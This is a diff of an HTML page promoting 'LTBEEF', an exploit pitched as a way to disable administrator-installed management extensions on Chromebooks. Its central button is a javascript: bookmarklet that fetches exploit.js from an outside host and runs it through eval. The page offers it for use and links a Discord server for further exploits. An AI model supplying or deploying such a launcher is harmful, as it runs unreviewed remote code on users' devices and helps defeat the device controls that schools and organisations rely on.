@@ -1,29 +1,10 @@
-style type="text/css">
-	@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;1,300;1,400&display=swap');
-	body {
-  		background-color: #000000;
-		text-align: center;
-		color: white;
-	}
-	a {
-		color: lightblue;
-	}
-	p {
-		font-family: Roboto;
-	}
-	h1 {
-		font-family: Roboto;
-	}
-</style>
-<link rel="icon" type="image/png" href="favico.png" sizes="16x16"/>
-<title>LTBEEF</title>
 
-<img src="logo.png" width="250" style="float:left">
-<br><br><br>
+
 <h1>LTBEEF</h1>
-<p style="text-align: center;">LTBEEF (Literally The Best Exploit Ever Found) is a exploit found by <a href="https://bypassi.com">bypassi</a> (Bypassi#7037) and is a great way to disable spyware that was installed on your chromebook by your SysAdmins!<br>The new UI was created by CompactCow#4717, Ingot ws created by Nebelung#1335<br><i>Site made by Piplup7575#6726, Logo created by LittleMissNyan</i></p>
+<p style="text-align: center;">LTBEEF (Literally The Best Exploit Ever Found) is a exploit found by <a href="https://www.bypassi.com">bypassi</a> (Bypassi#7037) and is a great way to disable spyware that was installed on your chromebook by your SysAdmins!
+The new UI was created by CompactCow#4717, Ingot ws created by Nebelung#1335<br><i>Site made by Piplup7575#6726, Logo created by LittleMissNyan</i></p>
 
-<p><strong>Please note that this exploit has been patched in newer versions of chrome, and my not work. <a href="https://discord.gg/9w8pf35AUC">Join the TN discord for more exploits</a>!</strong></p>
+<p><strong>Please note that this exploit has been patched in newer versions of chrome, and my not work. <a href="https://www.discord.gg/9w8pf35AUC">Join the TN discord for more exploits</a>!</strong></p>
 
 <div style="text-align: center; border: solid; padding: 5px;">
 <br><a style="display: block; cursor: pointer; background: #4081BF; font-size: 18px; sans-serif; color: #fff; text-align: center; width: calc(17px) rem; padding: 10px; border-radius: 30px; font-weight: 400; line-height: 1.4rem; box-shadow: 0 2px 0 lightblue; text-decoration: none; width: 8rem; margin-left: auto; margin-right: auto; font-family: Arial;" href="javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});"><strong>LTBEEF</strong></a><br>
